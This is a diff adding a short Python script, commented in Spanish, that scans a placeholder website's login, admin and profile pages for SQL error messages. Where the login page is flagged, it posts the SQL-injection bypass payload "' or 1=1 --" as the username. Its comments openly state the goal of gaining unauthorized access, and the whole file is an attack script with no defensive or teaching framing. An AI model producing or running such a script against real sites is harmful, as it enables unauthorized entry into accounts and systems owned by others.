@@ -1,0 +1,19 @@
+import requests
+
+target_url = 'https://www.example.com'
+
+# Escanear sitio web en busca de vulnerabilidades
+vulnerabilities = []
+for page in ['login', 'admin', 'profile']:
+    url = f"{target_url}/{page}"
+    response = requests.get(url)
+    if 'SQL error' in response.text:
+        vulnerabilities.append(f"{page} vulnerable a inyección de SQL")
+
+# Explotar vulnerabilidades para obtener acceso no autorizado
+if 'login vulnerable a inyección de SQL' in vulnerabilities:
+    login_data = {
+        'username': "' or 1=1 --",
+        'password': ''
+    }
+    response = requests.post(f"{target_url}/login", data=login_data)
